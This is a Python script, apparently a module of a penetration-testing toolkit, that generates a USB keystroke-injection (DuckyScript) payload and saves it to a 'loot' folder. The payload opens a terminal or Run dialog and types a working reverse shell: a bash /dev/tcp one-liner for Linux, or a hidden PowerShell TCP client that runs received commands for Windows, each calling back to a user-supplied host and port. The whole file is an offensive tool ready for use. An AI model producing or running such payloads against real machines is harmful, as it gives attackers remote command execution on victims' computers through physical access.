#!/usr/bin/env python3
# @name: Reverse-Shell DuckyScript Generator
# @desc: Generate an authorized Linux or Windows reverse-shell DuckyScript with the supplied callback endpoint and save it to loot for review.
# @category: exfiltration
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"host","label":"Authorized callback host or IP embedded in the generated script","type":"text","required":true},{"name":"port","label":"Callback TCP port embedded in the generated script","type":"number","default":"4444"},{"name":"platform","label":"Target operating system and generated command style","type":"select","choices":[{"value":"linux","label":"Linux — generate a Bash-compatible callback script"},{"value":"windows-powershell","label":"Windows PowerShell — generate a PowerShell callback script"}],"default":"linux"}]
import os,re,sys
from datetime import datetime,timezone
from pathlib import Path
def main():
 host=sys.argv[1] if len(sys.argv)>1 else ''
 try:port=int(sys.argv[2]);platform=sys.argv[3];assert re.fullmatch(r'[A-Za-z0-9_.:-]{1,253}',host) and 0<port<65536
 except (IndexError,ValueError,AssertionError):return 2
 command=f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'" if platform=='linux' else f"powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=([text.encoding]::ASCII).GetBytes($r);$s.Write($o,0,$o.Length)}}\""
 script='DELAY 1000\n'+('CTRL-ALT T\nDELAY 500\n' if platform=='linux' else 'GUI r\nDELAY 500\n')+f'STRING {command}\nENTER\n';root=Path(os.environ.get('CITYPOP_ROOT',Path(__file__).resolve().parents[2]));out=root/'loot'/'DuckyScripts';out.mkdir(parents=True,exist_ok=True);path=out/f"reverse_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}.txt";path.write_text(script);print(script);print('Saved:',path.relative_to(root));return 0
if __name__=='__main__':raise SystemExit(main())
